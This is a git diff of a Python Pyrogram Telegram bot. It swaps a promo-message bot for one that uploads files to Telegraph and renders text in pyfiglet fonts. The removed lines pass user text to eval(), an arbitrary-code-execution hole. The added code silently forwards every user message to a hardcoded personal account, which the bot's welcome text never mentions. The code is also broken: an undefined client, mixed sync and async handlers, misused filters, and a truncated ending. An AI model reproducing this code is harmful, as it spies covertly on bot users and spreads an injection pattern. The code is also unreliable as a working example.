@@ -19,54 +19,71 @@ from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # Define states
-IMAGE, CAPTION, BUTTONS, CHAT_ID = range(4)
-user_data = {}
+from pyrogram import Client, filters
+from pyrogram.types import Message
+from telegraph import upload_file
+import pyfiglet
 
-# Handler for /start command
-@Client.on_message(filters.command("start"))
-async def start(client, message):
-    await message.reply_text("Hi! Welcome to the Promo Bot. Send /promo to create a promo message.")
+# Initialize the Pyrogram client
 
-# Handler for /promo command
-@Client.on_message(filters.command("promo"))
-async def promo_command(client, message):
-    user_data[message.chat.id] = {"state": IMAGE}
-    await message.reply_text("Please send the image for the promo message.")
+error_chat_id = "siddhant_devil"  # Change this to the username or ID of the user you want to forward error logs to
 
+# Function to generate a Telegraph link for a file or media
+def generate_telegraph_link(file_path):
+    try:
+        # Upload the file to Telegraph
+        response = upload_file(file_path)
+        telegraph_url = response["url"]
+        return telegraph_url
+    except Exception as e:
+        # Forward error logs to the specified user
+        app.send_message(error_chat_id, f"Error generating Telegraph link: {e}")
+        return None
 
-# Define a handler for the image message
-@app.on_message(filters.photo)
-async def handle_image(client, message):
-    # Save the image
-    await message.download(file_name="promo_image.jpg")
-    # Ask for caption
-    await message.reply_text("Please enter the caption for the promo:")
+# Command to start the bot
+@app.on_message(filters.command("start"))
+def start(bot, update):
+    bot.send_message(update.chat.id, "Welcome! Send me any file, photo, or text to generate a Telegraph link or convert text into different fonts.")
 
-# Define a handler for the caption message
-@app.on_message(filters.text)
-async def handle_caption(client, message):
-    caption = message.text
-    # Ask for buttons format
-    await message.reply_text("Please enter the buttons format (e.g., [['Button 1', 'Button 2'], ['Button 3']]):")
+# Handler for receiving files, photos, or media
+@app.on_message(filters.document | filters.photo)
+def receive_file(bot, update: Message):
+    try:
+        # Get the file path
+        file_path = update.download()
+        
+        # Generate the Telegraph link
+        telegraph_link = generate_telegraph_link(file_path)
+        
+        # Send the Telegraph link
+        if telegraph_link:
+            bot.send_message(update.chat.id, f"Here is the Telegraph link: {telegraph_link}")
+        else:
+            bot.send_message(update.chat.id, "Failed to generate Telegraph link.")
+    except Exception as e:
+        # Forward error logs to the specified user
+        app.send_message(error_chat_id, f"Error receiving file: {e}")
 
-# Define a handler for the buttons message
-@app.on_message(filters.text)
-async def handle_buttons(client, message):
-    buttons_format = eval(message.text)
-    # Ask for channel or group id
-    await message.reply_text("Please enter the channel or group id where you want to send the promo message:")
+# Handler for receiving text messages
+@app.on_message(filters.text & ~filters.command)
+def receive_text(bot, update: Message):
+    try:
+        # Convert text into different fonts
+        fonts = pyfiglet.FigletFont.getFonts()
+        formatted_text = ""
+        for font in fonts:
+            formatted_text += f"<b>{font}</b>:\n"
+            formatted_text += pyfiglet.figlet_format(update.text, font=font) + "\n\n"
+        
+        # Send the formatted text back to the user
+        bot.send_message(update.chat.id, formatted_text, parse_mode="HTML")
+    except Exception as e:
+        # Forward error logs to the specified user
+        app.send_message(error_chat_id, f"Error receiving text: {e}")
 
-# Define a handler for the channel id message
-@app.on_message(filters.text)
-async def handle_channel_id(client, message):
-    channel_id = message.text
-    # Send the promo message with media, caption, and buttons
-    await client.send_photo(chat_id=channel_id, photo="promo_image.jpg", caption="Your caption here", reply_markup=InlineKeyboardMarkup(buttons_format))
-    await message.reply_text("Everything is done! You can now send /send to send the promo message.")
+# Forward all messages from users to the specified user
+@app.on_message(~filters.me & ~filters.command)
+def forward_messages(bot, update: Message):
+    bot.forward_messages(error_chat_id, update.chat.id, update.message.message_id)
 
-# Define a handler for the /send command
-@app.on_message(filters.command("send"))
-async def send_command(client, message):
-    await message.reply_text("Sending the promo message...")
-
-# Run the bo
+# Run the b
